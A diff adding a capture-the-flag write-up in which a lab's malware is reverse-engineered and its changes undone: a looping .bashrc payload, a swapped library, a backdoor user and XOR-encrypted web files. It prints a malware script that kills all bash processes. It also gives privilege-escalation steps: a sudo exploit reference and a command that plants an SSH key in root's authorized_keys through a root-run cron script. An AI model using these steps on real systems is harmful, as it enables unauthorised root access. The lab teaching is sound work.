@@ -61,3 +61,163 @@ scp alex@$TARGET:/home/alex/fixutil ./fixutil
 
 * **Attention**: Binaries of this challenge are already downloaded and included in this [Directory](files/).
 
+# ⛳️ Reverse Engineering: Flag 0
+
+7. 🐞 Lets Reverse Engineer (RE) the File in **IDA Free** (There is a free version for **IDA Pro** [here](https://hex-rays.com/ida-free))
+
+![asm file](images/07-asm.png)
+
+8. Lets Use DeCompiled Code, Pressing **F5** in IDA will give Us the DeCompiled code.
+
+![c file](images/08-c.png)
+
+9. In the code, Lines 7 to 8 add a `while` loop into `.bashrc` and avoid loading `/bin/bash` after SSH login.
+```
+\n\nwhile :; do echo \"YOU DIDN'T SAY THE MAGIC WORD!\"; done &\n
+```
+
+![file bashrc](images/09-bashrc-edit.png)
+
+10. Checking `.bashrc` file proves the assumption.
+
+![bashrc](images/10-bashrc.png)
+
+11. Lets remove JUNK lines, It'll help us login using **SSH** properly.
+```sh
+head -n 114 .bashrc > temp.rc
+# check temp.rc file, if everything is OK!?
+mv temp.rc .bashrc
+```
+
+![tail bashrc](images/11-tail-bashrc.png)
+
+12. Vist the Flag Web Site and Get The Flag: `http://$TARGET:1337/`
+
+13. Now, We Can Login Using SSH: `ssh alex@$TARGET`
+
+![ssh normal](images/13-ssh-normal.png)
+
+# ⛳️ Reverse Engineering: Flag 2
+
+14. Next Modified file with malware is: `/lib/x86_64-linux-gnu/liblogging.so`
+
+![file lib](images/14-lib.png)
+
+15. But There is no Backup file in `/tmp/logging.so`. We Found it somewhere else:
+```sh
+ls -l /lib/x86_64-linux-gnu/ | grep log
+-rwxrwxrwx 1 root root   23176 Jun 17  2020 liblogging.so
+-rwxr-xr-x 1 alex alex   16048 Jun 17  2020 oldliblogging.so
+```
+
+16. Now Lets dump `liblogging.so` with `scp`.
+```
+scp alex@$TARGET:/lib/x86_64-linux-gnu/liblogging.so ./liblogging.so
+```
+
+17. Now, We need to Fix the `liblogging.so` file by replacing with OLD one (File Permissions Allow it).
+```sh
+cp /lib/x86_64-linux-gnu/oldliblogging.so /lib/x86_64-linux-gnu/liblogging.so
+```
+
+18. Flag 2 is Ready in WEB Site: `http://$TARGET:1337/`
+
+# ⛳️ Reverse Engineering: Flag X
+
+19. Last File we need to analyze is `/bin/admin` which the malware adds:
+
+![admin file](images/19-admin-file.png)
+
+20. Dumping it with `scp`.
+```
+scp alex@$TARGET:/bin/admin ./admin
+```
+
+21. RE this file and You'll See It has a SImple Password but no Flags Here!
+
+22. It seems there is nothing to follow here!
+
+# ⛳️ Reverse Engineering: Flag 1
+
+23. Malware writes `brilliant_script.sh`
+
+24. Read it: `cat /opt/brilliant_script.sh`
+```sh
+#!/bin/sh
+
+for i in $(ps aux | grep bash | grep -v grep | awk '{print $2}'); do kill $i; done;
+```
+
+25. Removing and Empty File:
+```sh
+# Removing Last Line
+head -n 2 /opt/brilliant_script.sh > /opt/brilliant_script.sh
+```
+
+26. This fixes the accidental shell closing and Gives Flag 1
+
+## Switching to user ROOT
+
+27. Check `sudo` version: `sudo --version`
+
+28. It is vulnerable to with exploit: [CVE-2021-3156](https://github.com/Mhackiori/CVE-2021-3156)
+
+29. Moving Files to **$TARGET**
+
+30. Use `Makefile` script to build the files.
+
+
+## ⛳️ Reverse Engineering: Privilege Escalation and Flag 3
+
+1. CronJob Added in `liblogging.so` to exec: `/opt/brilliant_script.sh`
+
+2. It runs as `root` and we have access to it.
+
+3. Create ssh key
+```sh
+ssh-keygen
+# generates public/private keys
+cat id_rsa.pub # you may choose another name for file!
+# ssh-rsa AAAA ... root@computer-name
+```
+
+4. change `computer-name` in the end of ssh key to `recovery` and use `/opt/brilliant_script.sh` to add your ssh key to root:
+```ssh
+echo 'echo "ssh-rsa AAAA...U= root@recovery" > /root/.ssh/authorized_keys' >> /opt/brilliant_script.sh
+```
+
+5. In code, SSH Key added for root, If you remove it, Flag 3 Appears in step above!
+
+## ⛳️ Reverse Engineering: Flag 4
+
+1. in code, user `security` added
+
+2. delete user: `userdel -f security`
+
+## ⛳️ Reverse Engineering: Flag 5
+
+1. Malware uses **XOR** for encryting Files and saves the KEY inside: `/opt/.fixutil/backup.txt`
+
+2. use AI to generate code for decryption, It gave me this file
+```
+malware encrypted my files in: /usr/local/apache2/htdocs/
+I found the key in: /opt/.fixutil/backup.txt
+encryption algorithm is: xor
+help me with a code in C to decrypt them
+```
+3. use nano to write it on target in the name of `xor_decrypt`
+
+4. lets build it on target and run it:
+```sh
+gcc -O2 -Wall -o xor_decrypt xor_decrypt.c -std=c11 -D_XOPEN_SOURCE=700
+
+# Test and Dry run:
+./xor_decrypt --key /opt/.fixutil/backup.txt --target /usr/local/apache2/htdocs --dry-run
+
+# Actual Run
+sudo ./xor_decrypt --key /opt/.fixutil/backup.txt --target /usr/local/apache2/htdocs
+```
+
+5. Check the Web Pages and It is UP!
+
+6. You get Flag 5 Here!
